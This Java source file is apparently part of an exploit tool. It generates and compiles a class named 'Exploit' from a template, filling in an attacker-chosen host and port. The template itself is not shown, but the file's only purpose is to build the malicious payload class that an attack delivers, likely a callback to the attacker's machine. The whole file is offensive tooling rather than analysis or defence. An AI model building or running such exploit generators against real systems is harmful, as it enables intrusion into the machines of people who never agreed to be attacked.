package com.github.marceloleite2604;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.concurrent.TimeUnit;

public class ExploitClassGenerator {

  public static final String CLASS_NAME = "Exploit";

  private static final String TEMPORARY_DIRECTORY_PREFIX = "exploiter";
  private static final String EXPLOIT_JAVA_FILE_NAME = CLASS_NAME + ".java";
  private static final String EXPLOIT_CLASS_TEMPLATE_LOCATION = EXPLOIT_JAVA_FILE_NAME + ".template";

  private static final String COMPILATION_COMMAND_TEMPLATE = Exploiter.JAVA_8_HOME_PATH + "/bin/javac %s -d %s";

  private static final Path CURRENT_DIRECTORY = Paths.get(".");

  public void generate(String host, int port) throws IOException, InterruptedException {

    final var javaCode = generateJavaCode(host, port);
    final var javaFile = writeJavaFile(javaCode);
    compileJavaFile(javaFile);
  }

  private Path writeJavaFile(String javaCode) throws IOException {
    final var tempDirectory = Files.createTempDirectory(TEMPORARY_DIRECTORY_PREFIX);
    final var javaFilePath = tempDirectory.resolve(Paths.get(EXPLOIT_JAVA_FILE_NAME));
    return Files.writeString(javaFilePath, javaCode, StandardOpenOption.CREATE);
  }

  private String generateJavaCode(String host, int port) throws IOException {
    final var templateInputStream = Exploiter.class.getClassLoader()
      .getResourceAsStream(EXPLOIT_CLASS_TEMPLATE_LOCATION);

    if (templateInputStream == null) {
      throw new IllegalStateException("Could not find Exploit class template.");
    }

    var template = new String(templateInputStream.readAllBytes());
    template = template.replace("<host>", host);
    template = template.replace("<port>", Integer.toString(port));
    return template;
  }

  private void compileJavaFile(Path javaFile) throws IOException, InterruptedException {
    final var compilationCommand = String.format(
      COMPILATION_COMMAND_TEMPLATE,
      javaFile,
      CURRENT_DIRECTORY);

    final var compilingProcess = Runtime.getRuntime().exec(compilationCommand);

    final var exited = compilingProcess.waitFor(10, TimeUnit.SECONDS);

    if (!exited) {
      throw new IllegalStateException("Compiling process did not exited after 10 seconds.");
    }

    final var exitValue = compilingProcess.exitValue();

    if (exitValue != 0) {
      throw new IllegalStateException("Compiling process exited with code " + exitValue);
    }
  }
}
